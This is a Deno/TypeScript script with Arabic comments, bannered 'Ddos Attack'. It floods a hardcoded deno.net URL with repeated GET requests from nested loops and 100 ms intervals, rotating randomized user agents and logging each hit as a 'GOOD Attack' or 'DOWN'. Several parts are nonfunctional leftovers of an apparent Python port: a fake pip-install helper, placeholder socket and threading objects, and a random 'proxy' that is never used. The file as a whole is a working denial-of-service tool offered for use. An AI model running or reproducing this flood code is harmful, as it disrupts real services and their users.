// deno run --unstable --allow-net script.ts

// استيراد المكتبات بشكل npm مثل ما طلبت
import figlet from "npm:figlet";
import process from "node:process";
import { execSync } from "node:child_process";

// بديل للـ subprocess + pip install (رمزي لأن Deno ما يدعم pip)
function install_and_import(packageName: string, moduleName?: string) {
  try {
    // المحاكاة: نفترض أن المكتبة موجودة دائمًا
    console.log(`✅ مكتبة ${packageName} محملة (تخيلية في Deno)`);
  } catch (_e) {
    console.log(`\x1b[1;33m[!] جاري تثبيت المكتبة: ${packageName} ...\x1b[0m`);
    try {
      execSync(`pip install ${packageName}`, { stdio: "inherit" });
      console.log(`\x1b[1;32m[✓] تم تثبيت المكتبة: ${packageName}\x1b[0m`);
    } catch {
      console.error(`❌ فشل التثبيت: ${packageName}`);
    }
  }
}

// === استخدام الدالة (رمزي فقط في Deno)
install_and_import("user_agent");
install_and_import("pyfiglet");

// === استيراد datetime, socket, threading, argparse ===
// تم تركهم رمزيًا لأن Deno لا يدعمهم بشكل مباشر كـ Python
const datetime = new Date();
const socket = {}; // لا داعي له هنا
const threading = {}; // رمزي فقط
const argparse = {}; // غير مستخدم في كودك الأصلي فعليًا

// === مكتبة توليد user-agent ===
function generate_user_agent(): string {
  const browsers = ["Chrome", "Firefox", "Safari", "Edge"];
  const systems = ["Windows NT 10.0", "Macintosh", "X11; Linux x86_64"];
  const browser = browsers[Math.floor(Math.random() * browsers.length)];
  const system = systems[Math.floor(Math.random() * systems.length)];
  return `Mozilla/5.0 (${system}) AppleWebKit/537.36 (KHTML, like Gecko) ${browser}/99.0 Safari/537.36`;
}

// === ألوان
const F = '\x1b[1;32m';
const Z = '\x1b[1;31m';
const S = '\x1b[1;33m';
const B = '\x1b[38;5;208m';

console.log(`${F}[✓] جميع المكتبات مثبتة وجاهزة للاستخدام!${Z}`);

// === الطباعة بالشكل الأصلي
const logo = figlet.textSync('Ddos Attack', { font: 'Slant' });
console.log(logo);

// === نفس الدالة المرتبطة
function linked() {
  const sg = '2';
  if (sg === '1') {
    for (let i = 0; i < 50000; i++) {
      AttackMahos();
    }
  } else if (sg === '2') {
    for (let i = 0; i < 500000000000; i++) {
      ProxyAttack();
    }
  }
}

// === نفس دالة الهجوم المباشر
function AttackMahos() {
  setInterval(async () => {
    const headers = new Headers({
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Accept-Language': 'en-us,en;q=0.5',
      'Accept-Encoding': 'gzip,deflate',
      'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
      'Keep-Alive': '115',
      'Connection': 'keep-alive',
      'User-Agent': generate_user_agent()
    });

    try {
      const response = await fetch(url, { method: 'GET', headers });
      if (response.status === 200) {
        console.log(`${F}GOOD Attack: ${url}`);
      } else {
        console.log(`${Z}BAD Attack: ${url}`);
      }
    } catch {
      console.log(`${S}DOWN: ${url}`);
    }
  }, 100);
}

// === نفس دالة الهجوم عبر البروكسي
function ProxyAttack() {
  setInterval(async () => {
    const ip = Array.from({ length: 4 }, () => Math.floor(Math.random() * 256)).join('.');
    const pl = [19, 20, 21, 22, 23, 24, 25, 80, 53, 111, 110, 443, 8080, 139, 445, 512, 513, 514, 4444, 2049, 1524, 3306, 5900];
    const port = pl[Math.floor(Math.random() * pl.length)];
    const proxy = `${ip}:${port}`;

    const headers = new Headers({
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Accept-Language': 'en-us,en;q=0.5',
      'Accept-Encoding': 'gzip,deflate',
      'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
      'Keep-Alive': '115',
      'Connection': 'keep-alive',
      'User-Agent': generate_user_agent()
    });

    try {
      const response = await fetch(url, { method: 'GET', headers });
      if (response.status === 200) {
        console.log(`${F}GOOD Attack: ${url} | ${proxy}`);
      } else {
        console.log(`${Z}BAD Attack: ${url} | ${proxy}`);
      }
    } catch {
      console.log(`${S}DOWN: ${url} |`);
    }
  }, 100);
}

// === نفس الرابط
const url = 'https://ihhjjjh-x02rn86kw4ns.vvvvvhkj.deno.net/';

// === تشغيل البرنامج
linked();
